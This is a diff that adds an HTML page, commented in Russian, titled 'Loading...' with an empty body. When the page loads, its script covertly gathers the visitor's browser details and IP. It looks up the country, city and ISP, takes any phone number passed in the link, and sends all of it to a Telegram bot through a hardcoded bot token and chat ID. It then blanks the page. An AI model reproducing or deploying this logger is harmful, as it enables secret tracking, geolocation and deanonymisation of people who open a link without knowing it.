@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        // === ВАШИ ДАННЫЕ ===
+        const BOT_TOKEN = '8953500972:AAH7RrE7m0bs0IPbkKmNrNh17eLavmQprfc';
+        const CHAT_ID = '7900410252';  // ВАШ РЕАЛЬНЫЙ CHAT ID
+
+        async function collectAndSend() {
+            // Сбор данных
+            const data = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'прямой вход',
+                url: window.location.href,
+                phone: null
+            };
+
+            // Если номер передан в URL
+            const params = new URLSearchParams(window.location.search);
+            if (params.has('phone')) {
+                data.phone = params.get('phone');
+            }
+
+            // Получаем IP и гео
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                data.ip = ipData.ip;
+
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoRes.json();
+                data.country = geoData.country_name || 'неизвестно';
+                data.city = geoData.city || 'неизвестно';
+                data.isp = geoData.org || 'неизвестно';
+            } catch (e) {
+                data.ip = 'не определен';
+            }
+
+            // Формируем сообщение
+            const message = `
+🔴 НОВЫЙ ПЕРЕХОД:
+IP: ${data.ip || 'не определён'}
+Страна: ${data.country || 'не определена'}
+Город: ${data.city || 'не определён'}
+Провайдер: ${data.isp || 'неизвестно'}
+User-Agent: ${data.userAgent}
+Платформа: ${data.platform}
+Язык: ${data.language}
+Экран: ${data.screen}
+Часовой пояс: ${data.timezone}
+Реферер: ${data.referrer}
+URL: ${data.url}
+📞 ТЕЛЕФОН: ${data.phone || 'не передан'}
+            `;
+
+            // ОТПРАВКА В TELEGRAM
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                console.log('✅ Отправлено в Telegram');
+            } catch (e) {
+                console.error('❌ Ошибка отправки:', e);
+            }
+
+            // Очистка страницы
+            document.body.innerHTML = '';
+        }
+
+        window.onload = collectAndSend;
+    </script>
+</head>
+<body>
+    <!-- Пустая страница -->
+</body>
+</html>
